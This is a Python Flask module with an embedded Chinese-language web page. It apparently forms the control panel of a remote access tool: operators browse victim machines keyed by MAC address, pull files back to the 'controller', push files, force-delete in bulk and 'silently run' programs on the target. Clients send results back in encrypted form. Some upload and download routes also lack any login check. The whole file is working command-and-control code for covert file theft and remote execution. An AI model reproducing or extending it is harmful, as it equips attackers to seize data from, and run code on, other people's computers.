from flask import Blueprint, request, render_template_string, session, redirect, url_for, send_from_directory, jsonify, Response
from datetime import datetime
import os, time, json, threading
from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE, decrypt_data

from werkzeug.utils import secure_filename
bp = Blueprint('file', __name__)

@bp.route('/files/<mac>')
def files_page(mac):
    if not session.get('logged_in'): return redirect(url_for('auth.login'))
    if mac not in clients_db: return "设备不存在"

    FILES_HTML = r"""
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>文件管理 - {{ info.name }} ({{ mac }})</title>
        <style>
            body { background: #f0f2f5; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; padding: 10px; margin: 0; }
            .header { border-bottom: 2px solid #ddd; padding-bottom: 10px; margin-bottom: 10px; display: flex; flex-direction: column; }
            .header a { margin-top: 10px; color: #007bff; text-decoration: none; }
            .header a:hover { text-decoration: underline; }
            .btn { background: #007bff; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; margin: 2px; }
            .btn:hover { background: #0056b3; }
            .path-bar { display: flex; flex-wrap: wrap; gap: 5px; margin-bottom: 10px; align-items: center; }
            .path-bar input { flex-grow: 1; padding: 5px; min-width: 150px; }
            .table-responsive { overflow-x: auto; }
            table { width: 100%; min-width: 600px; border-collapse: collapse; background: white; margin-bottom: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); user-select: none; }
            th, td { padding: 10px; border-bottom: 1px solid #ddd; text-align: left; }
            th { background: #f8f9fa; }
            tr:hover { background: #e2e6ea; cursor: pointer;}
            .icon { width: 20px; text-align: center; display: inline-block; }
            #loading { color: red; font-weight: bold; display: none; }
            /* Context Menu Styles */
            #context-menu { display: none; position: absolute; z-index: 1000; background-color: white; border: 1px solid #ccc; box-shadow: 2px 2px 5px rgba(0,0,0,0.2); border-radius: 4px; padding: 5px 0; min-width: 150px; }
            .context-item { padding: 8px 15px; cursor: pointer; font-size: 14px; }
            .context-item:hover { background-color: #007bff; color: white; }
        </style>
    </head>
    <body onclick="hideContextMenu()">
        <div class="header">
            <span>📁 {{ info.name }} [{{ mac }}] - 远程文件管理 <span id="conn_status"></span></span>
            <a href="/">[ 返回设备列表 ]</a>
        </div>
        <div class="path-bar">
            <span>当前路径:</span>
            <input type="text" id="current_path" value="此电脑" onkeydown="if(event.key==='Enter') loadPath()">
            <button class="btn" onclick="loadPath()">前往</button>
            <button class="btn" onclick="loadPath(true)" style="background:#28a745;">刷新</button>
            <span id="loading">执行中...请稍候</span>
        </div>

        <div style="margin-bottom: 10px;">
            <input type="file" id="uploadFile" style="display:inline-block; border:1px solid #ccc; padding:3px; max-width: 100%;">
            <br><br>
            <button class="btn" onclick="uploadToServer()">上传到当前目录</button>
            <button class="btn" onclick="cmdMkdir()" style="background:#17a2b8;">新建文件夹</button>
        </div>

        <div class="table-responsive">
        <table>
            <thead>
                <tr>
                    <th style="width:30px;"><input type="checkbox" onclick="toggleAllFiles(this)"></th>
                    <th style="width:30px;"></th>
                    <th onclick="sortFiles('Name')" style="cursor:pointer; user-select:none;">名称 <span id="sort_Name"></span></th>
                    <th onclick="sortFiles('Length')" style="cursor:pointer; user-select:none; width:120px;">大小 <span id="sort_Length"></span></th>
                    <th onclick="sortFiles('LastWriteTime')" style="cursor:pointer; user-select:none; width:200px;">修改时间 <span id="sort_LastWriteTime"></span></th>
                </tr>
            </thead>
            <tbody id="file_list">
                <tr><td colspan="5" style="text-align:center;color:#888;">请点击“前往”以加载目录...</td></tr>
            </tbody>
        </table>
        </div>

        <!-- Context Menu Template -->
        <div id="context-menu">
            <div class="context-item single-only" id="m_open" onclick="onContextOpen()">打开 / 进入</div>
            <div class="context-item single-only" id="m_down" onclick="onContextDown()">📥 下载到控制端</div>
            <div class="context-item single-only" id="m_exec" onclick="onContextExec()">⚡ 在此电脑静默运行</div>
            <div class="context-item single-only" id="m_rn" onclick="onContextRn()">📝 重命名</div>

            <div class="context-item multi-only" id="m_down_multi" onclick="onContextDownMulti()" style="display:none;">📥 批量后台下载</div>
            <div class="context-item multi-only" id="m_del_multi" onclick="onContextDelMulti()" style="display:none; color:red;">🗑️ 批量强制删除</div>

            <div style="border-top:1px solid #ddd; margin:4px 0;" class="single-only"></div>
            <div class="context-item single-only" style="color:red;" id="m_del" onclick="onContextDel()">🗑️ 强制删除</div>
        </div>

        <div style="margin-top: 20px; background: #222; color: #0f0; padding: 10px; height: 150px; overflow-y: scroll; font-family: Consolas;">
            <div style="display:flex; justify-content:space-between; margin-bottom:5px;">
                <b>[终端通信调试日志]</b>
                <button onclick="document.getElementById('debug_log').innerText=''" style="background:#444;color:#fff;border:none;padding:2px 5px;cursor:pointer;">清空</button>
            </div>
            <pre id="debug_log" style="white-space: pre-wrap; word-wrap: break-word; margin: 0;"></pre>
        </div>

        <script>
            function checkPing() {
                fetch('/api/ping/{{ mac }}')
                .then(r => r.json())
                .then(data => {
                    let st = document.getElementById('conn_status');
                    if(data.status === 'online') {
                        st.innerHTML = '🟢 实时设备在线';
                        st.style.color = '#28a745';
                    } else {
                        st.innerHTML = '🔴 设备疑似掉线';
                        st.style.color = 'red';
                    }
                });
            }
            setInterval(checkPing, 3000);
            checkPing();

            function toggleAllFiles(source) {
                document.querySelectorAll('.file-check').forEach(cb => cb.checked = source.checked);
            }

            function sendFileCmdAsync(cmd) {
                return new Promise((resolve) => {
                    sendFileCmd(cmd, res => resolve(res));
                });
            }

            async function onContextDelMulti() {
                let checked = document.querySelectorAll('.file-check:checked');
                if(checked.length === 0) return;
                if(!confirm('确定批量强制删除选中的 ' + checked.length + ' 个项目？')) return;
                hideContextMenu();
                for (let i = 0; i < checked.length; i++) {
                    await sendFileCmdAsync("F_CMD:DEL:" + checked[i].dataset.path);
                }
                loadPath();
            }

            async function onContextDownMulti() {
                let checked = document.querySelectorAll('.file-check:checked');
                if(checked.length === 0) return;
                hideContextMenu();
                for (let i = 0; i < checked.length; i++) {
                    if (checked[i].dataset.isdir === 'true') continue;
                    let path = checked[i].dataset.path;
                    let parts = path.replace(/\\\\/g, '\\').split('\\');
                    let fName = parts[parts.length - 1];
                    let dlLink = "/downloads/{{ mac }}/" + encodeURIComponent(fName);
                    let url = window.location.origin + "/api/file/client_upload/{{ mac }}?fname=" + encodeURIComponent(fName);

                    await sendFileCmdAsync("F_CMD:UP:" + url + "|" + path);
                    logDebug("✅ 成功拉取缓存拉取下载链接：" + dlLink);
                }
                alert("勾选文件的下载请求已依次下发，由于浏览器限制无法一次性自动弹出多个下载窗口，请稍后手动点击调试控制台内的所有成功拉取链接即可下载。");
            }

            function logDebug(msg) {
                try {
                    let el = document.getElementById('debug_log');
                    if (el) {
                        let d = new Date();
                        let ts = d.getHours().toString().padStart(2,'0') + ':' + d.getMinutes().toString().padStart(2,'0') + ':' + d.getSeconds().toString().padStart(2,'0');
                        el.innerText += `[${ts}] ${msg}\n`;
                        el.parentElement.scrollTop = el.parentElement.scrollHeight;
                    }
                } catch(e) { console.error(e); }
            }

            let polling = false;
            let currentSelectedFile = null;
            let currentSelectedIsDir = false;

            let fileSortCol = 'Name';
            let fileSortDir = 1;
            let currentFiles = [];

            function sortFiles(col) {
                if (fileSortCol === col) fileSortDir *= -1;
                else { fileSortCol = col; fileSortDir = 1; }
                renderFiles();
            }

            function renderFiles() {
                let tb = document.getElementById('file_list');
                tb.innerHTML = '';

                ['Name', 'Length', 'LastWriteTime'].forEach(c => {
                    let el = document.getElementById('sort_' + c);
                    if(el) el.innerText = (c === fileSortCol) ? (fileSortDir===1 ? ' ▲' : ' ▼') : '';
                });

                let p = document.getElementById('current_path').value;
                let reqPath = (p === "此电脑" || p === "ROOT") ? "ROOT" : p;

                let sorted = [...currentFiles];
                sorted.sort((a,b) => {
                    if(a.IsDir && !b.IsDir) return -1;
                    if(!a.IsDir && b.IsDir) return 1;
                    let vA = a[fileSortCol];
                    let vB = b[fileSortCol];
                    if(fileSortCol==='Name' || fileSortCol==='LastWriteTime') {
                        vA = (vA||'').toString().toLowerCase();
                        vB = (vB||'').toString().toLowerCase();
                    } else {
                        vA = parseFloat(vA) || 0;
                        vB = parseFloat(vB) || 0;
                    }
                    if(vA < vB) return -1 * fileSortDir;
                    if(vA > vB) return 1 * fileSortDir;
                    return 0;
                });

                if (reqPath !== "ROOT") {
                    let upTr = document.createElement('tr');
                    upTr.innerHTML = `<td></td><td class="icon">📁</td><td colspan="3">..</td>`;
                    upTr.ondblclick = () => goUp();
                    tb.appendChild(upTr);
                }

                sorted.forEach(f => {
                    let tr = document.createElement('tr');
                    let isDir = !!f.IsDir;
                    let fullPath = combinePath(p, f.Name);

                    tr.oncontextmenu = (e) => showContextMenu(e, fullPath, isDir);

                    let cb = `<input type="checkbox" class="file-check" data-path="${fullPath.replace(/"/g, '&quot;')}" data-isdir="${isDir}">`;
                    let displayIcon = isDir ? '📁' : getFileIcon(f.Name);
                    if (reqPath === "ROOT") displayIcon = '💽';
                    tr.innerHTML = `<td>${reqPath !== "ROOT" ? cb : ''}</td><td class="icon">${displayIcon}</td><td>${f.Name}</td><td>${isDir ? '' : formatSize(f.Length)}</td><td>${f.LastWriteTime ? (f.LastWriteTime.DateTime || f.LastWriteTime) : ''}</td>`;

                    tr.querySelectorAll('td:not(:first-child)').forEach(td => {
                        if (isDir) {
                            td.ondblclick = () => openDir(fullPath);
                        } else {
                            td.ondblclick = () => { if(confirm('是否要在远程执行该文件？')) cmdExec(fullPath); };
                        }
                    });
                    tb.appendChild(tr);
                });
            }

            function hideContextMenu() {
                try { document.getElementById('context-menu').style.display = 'none'; } catch(e){}
            }

            function showContextMenu(e, path, isDir) {
                e.preventDefault();
                let clickedCheckbox = e.currentTarget.querySelector('.file-check');
                if (clickedCheckbox && !clickedCheckbox.checked) {
                    clickedCheckbox.checked = true;
                }

                let checked = document.querySelectorAll('.file-check:checked');
                let isMulti = checked.length > 1;

                currentSelectedFile = path;
                currentSelectedIsDir = isDir;

                let menu = document.getElementById('context-menu');
                if(isMulti) {
                    document.querySelectorAll('.single-only').forEach(el => el.style.display = 'none');
                    document.querySelectorAll('.multi-only').forEach(el => el.style.display = 'block');
                } else {
                    document.querySelectorAll('.single-only').forEach(el => el.style.display = 'block');
                    document.querySelectorAll('.multi-only').forEach(el => el.style.display = 'none');

                    document.getElementById('m_open').style.display = isDir ? 'block' : 'none';
                    document.getElementById('m_down').style.display = isDir ? 'none' : 'block';
                    document.getElementById('m_exec').style.display = isDir ? 'none' : 'block';
                }
                menu.style.display = 'block';
                menu.style.left = e.pageX + 'px';
                menu.style.top = e.pageY + 'px';
            }

            function onContextOpen() { if(currentSelectedIsDir) openDir(currentSelectedFile); }
            function onContextDown() { cmdDown(currentSelectedFile); }
            function onContextExec() { cmdExec(currentSelectedFile); }
            function onContextRn() { cmdRn(currentSelectedFile); }
            function onContextDel() { cmdDel(currentSelectedFile); }

            function showLoading(show) {
                document.getElementById('loading').style.display = show ? 'inline' : 'none';
            }

            function sendFileCmd(cmd, callback) {
                showLoading(true);
                logDebug("➤ [发送命令]: " + cmd);
                fetch('/api/file/cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({mac: '{{ mac }}', cmd: cmd})
                }).then(res => {
                    logDebug("⏳ [等待响应中...]");
                    pollResult(callback);
                }).catch(err => {
                    logDebug("❌ [发送失败]: " + err);
                    showLoading(false);
                });
            }

            function pollResult(callback) {
                if(polling) return;
                polling = true;
                let tries = 0;
                let itv = setInterval(() => {
                    fetch('/api/file/result/{{ mac }}')
                    .then(r => r.json())
                    .then(data => {
                        if(data.status === 'ready') {
                            clearInterval(itv);
                            polling = false;
                            showLoading(false);
                            logDebug("✅ [获得响应数据成功] 长度: " + (data.data ? data.data.length : 0));
                            callback(data.data);
                        } else {
                            tries++;
                            if (tries > 100) {
                                clearInterval(itv);
                                polling = false;
                                showLoading(false);
                                logDebug("❌ [超时]: 多次轮询未能获取到返回结果");
                            }
                        }
                    }).catch(e => {
                        clearInterval(itv);
                        polling = false;
                        showLoading(false);
                        logDebug("❌ [轮询网络错误]: " + e);
                    });
                }, 200);
            }

            function formatSize(bytes) {
                if (bytes == null) return '';
                if (bytes === 0) return '0 B';
                const k = 1024;
                const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
                const i = Math.floor(Math.log(bytes) / Math.log(k));
                return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
            }

            function combinePath(parent, fName) {
                if(parent === "此电脑" || parent === "ROOT" || parent === "") return fName + "\\";
                if(parent.endsWith("\\") || parent.endsWith("/")) return parent + fName;
                return parent + "\\" + fName;
            }

            function getFileIcon(fName) {
                if (!fName || typeof fName !== 'string') return '📄';
                let idx = fName.lastIndexOf('.');
                if(idx === -1) return '📄';
                let ext = fName.substring(idx + 1).toLowerCase();
                const icons = {
                    'exe': '⚙️', 'dll': '⚙️', 'sys': '⚙️',
                    'mp4': '🎬', 'mkv': '🎬', 'avi': '🎬', 'mov': '🎬',
                    'mp3': '🎵', 'wav': '🎵', 'flac': '🎵',
                    'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️', 'bmp': '🖼️',
                    'txt': '📝', 'doc': '📝', 'docx': '📝', 'log': '📝',
                    'pdf': '📕',
                    'zip': '🗜️', 'rar': '🗜️', '7z': '🗜️', 'iso': '🗜️', 'tar': '🗜️',
                    'py': '🐍', 'js': '📜', 'html': '🌐', 'css': '🎨', 'go': '🐹', 'cpp': 'Ⓜ️', 'c': 'Ⓜ️'
                };
                return icons[ext] || '📄';
            }

            function loadPath(refresh = false) {
                try {
                let p = document.getElementById('current_path').value;
                if (!p) { p = "此电脑"; document.getElementById('current_path').value = p; }

                let reqPath = (p === "此电脑" || p === "ROOT") ? "ROOT" : p;
                sendFileCmd("F_CMD:LIST:" + reqPath, (resText) => {
                    let tb = document.getElementById('file_list');
                    tb.innerHTML = '';
                    currentFiles = [];

                    try {
                        if (resText) resText = resText.trim();
                        let firstBracket = resText.indexOf('[');
                        let firstBrace = resText.indexOf('{');
                        if (firstBracket >= 0 && (firstBrace === -1 || firstBracket < firstBrace)) {
                            resText = resText.substring(firstBracket);
                            let lastBracket = resText.lastIndexOf(']');
                            if (lastBracket > -1) resText = resText.substring(0, lastBracket + 1);
                        } else if (firstBrace >= 0) {
                            resText = resText.substring(firstBrace);
                            let lastBrace = resText.lastIndexOf('}');
                            if (lastBrace > -1) resText = resText.substring(0, lastBrace + 1);
                        }

                        let parsed = JSON.parse(resText);
                        if(Array.isArray(parsed)) {
                            currentFiles = parsed;
                        } else if(parsed && parsed.Name) { 
                            currentFiles = [parsed];
                        }
                    } catch(e) {
                         logDebug("❌ [JSON解析失败]: " + e);
                         tb.innerHTML = '<tr><td colspan="5">没有可用的文件或解析结果失败</td></tr>';
                         return;
                    }
                    renderFiles();
                });
                } catch(topE) { logDebug("❌ [JS异常]: " + topE); }
            }

            function openDir(path) {
                document.getElementById('current_path').value = path;
                loadPath();
            }

            function goUp() {
                let p = document.getElementById('current_path').value;
                if(p === "此电脑" || p === "ROOT") return;
                p = p.replace(/\\$/, '');
                let lastSlash = p.lastIndexOf('\\');
                if (lastSlash > 0) {
                    p = p.substring(0, lastSlash);
                    if(p.endsWith(':')) p += '\\';
                    openDir(p);
                } else if (lastSlash === 0) {
                    openDir('\\');
                } else {
                    openDir('此电脑');
                }
            }

            function cmdDel(path) {
                if(!confirm('确定强制删除 ' + path + ' ?')) return;
                sendFileCmd("F_CMD:DEL:" + path, (res) => { alert(res); loadPath(); });
            }

            function cmdRn(path) {
                let newName = prompt('输入新的名称:', 'new_name');
                if(!newName) return;
                let p = document.getElementById('current_path').value;
                sendFileCmd("F_CMD:RN:" + path + "|" + newName, (res) => { alert(res); loadPath(); });
            }

            function cmdDown(path) {
                let parts = path.replace(/\\\\/g, '\\').split('\\');
                let fName = parts[parts.length - 1];
                let fCmdUrl = window.location.origin + "/api/file/client_upload/{{ mac }}?fname=" + encodeURIComponent(fName); 
                sendFileCmd("F_CMD:UP:" + fCmdUrl + "|" + path, (res) => { 
                     logDebug("成功触发下载: " + res);
                     let dlLink = "/downloads/{{ mac }}/" + encodeURIComponent(fName);
                     if(confirm("文件可能已传输至控制端缓存，是否立刻尝试下载?")) {
                         window.open(dlLink, '_blank');
                     }
                });
            }

            function cmdExec(path) {
                if(!confirm('确定要在目标端静默执行 ' + path + ' 吗?')) return;
                sendFileCmd("F_CMD:EXEC:" + path, (res) => { alert("执行返回:\n" + res); });
            }

            function cmdMkdir() {
                let p = document.getElementById('current_path').value;
                let name = prompt('输入文件夹名:');
                if(name) {
                    let full = combinePath(p, name);
                    sendFileCmd("F_CMD:MKDIR:" + full, (res) => { loadPath(); });
                }
            }

            function uploadToServer() {
                let fileInput = document.getElementById('uploadFile');
                if(!fileInput.files.length) { alert("请选择文件"); return; }
                let file = fileInput.files[0];
                let p = document.getElementById('current_path').value;
                let targetPath = combinePath(p, file.name);

                let formData = new FormData();
                formData.append('file', file);

                let uploadUrl = '/api/file/server_upload/{{ mac }}';
                showLoading(true);
                fetch(uploadUrl, { method: 'POST', body: formData })
                .then(r => r.json())
                .then(data => {
                    if (data.status === 'ok') {
                         sendFileCmd("F_CMD:DOWN:" + data.url + "|" + targetPath, (res) => {
                             logDebug("受控端接管下载完成: " + res);
                             loadPath();
                         });
                    } else {
                         alert("上传服务失败");
                         showLoading(false);
                    }
                }).catch(e => { alert(e); showLoading(false); });
            }

            setTimeout(() => {
                logDebug("页面加载完成，准备拉取目录...");
                loadPath();
            }, 500);
        </script>
    </body>
    </html>
    """
    return render_template_string(FILES_HTML, mac=mac, info=clients_db[mac])

@bp.route('/api/file/client_upload/<mac>', methods=['POST'])
def client_upload(mac):
    f = request.files.get('file')
    if f:
        dest_dir = os.path.join(UPDATE_DIR, 'downloads', mac)
        os.makedirs(dest_dir, exist_ok=True)
        # Using secure_filename might drop unicode characters. Just replace slashes.
        fname = request.args.get('fname') or f.filename
        fname = fname.replace('\\', '/').split('/')[-1]
        safe_name = fname.replace('/', '_').replace('\\', '_')
        f.save(os.path.join(dest_dir, safe_name))
        return "OK", 200
    return "Fail", 400

@bp.route('/downloads/<mac>/<path:filename>')
def serve_download(mac, filename):
    if not session.get('logged_in'): return "未登录", 403
    # 修复：允许正确解析带中文等特殊字符的文件名，防止 werkzeug secure_filename 把特殊字符吃了导致文件无法访问。
    # 我们自己去重构下被替换掉的文件名，或者只把反斜杠过滤，因为前端已经通过 replace 把斜杠替换成下划线了。
    safe_name = filename.replace('/', '_').replace('\\', '_');
    return send_from_directory(os.path.join(UPDATE_DIR, 'downloads', mac), safe_name, as_attachment=True)

@bp.route('/api/file/server_upload/<mac>', methods=['POST'])
def server_upload(mac):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    f = request.files.get('file')
    if f:
        dest_dir = os.path.join(UPDATE_DIR, 'uploads', mac)
        os.makedirs(dest_dir, exist_ok=True)
        safe_name = f.filename.replace('/', '_').replace('\\', '_')
        f.save(os.path.join(dest_dir, safe_name))
        return jsonify({"status": "ok", "url": f"{request.host_url}uploads/{mac}/{safe_name}"})
    return jsonify({"status": "error"}), 400

@bp.route('/uploads/<mac>/<path:filename>')
def serve_upload(mac, filename):
    safe_name = filename.replace('/', '_').replace('\\', '_');
    return send_from_directory(os.path.join(UPDATE_DIR, 'uploads', mac), safe_name)

@bp.route('/api/file/cmd', methods=['POST'])
def api_file_cmd():
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    data = request.json
    mac = data.get('mac')
    cmd = data.get('cmd')
    if mac in clients_db:
        clients_db[mac]['pending_file_cmd'] = cmd
        clients_db[mac]['file_result'] = None
        save_db()
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"})

@bp.route('/file_result', methods=['POST'])
def file_result():
    mac = decrypt_data(request.form.get('mac', ''))
    output = decrypt_data(request.form.get('output', ''))
    if mac in clients_db:
        clients_db[mac]['file_result'] = output
        save_db()
    return "OK", 200

@bp.route('/api/file/result/<mac>')
def api_file_result(mac):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    if mac in clients_db:
        res = clients_db[mac].get('file_result')
        if res is not None:
            clients_db[mac]['file_result'] = None
            return jsonify({"status": "ready", "data": res})
        return jsonify({"status": "waiting"})
    return jsonify({"status": "error"})

from werkzeug.utils import secure_filename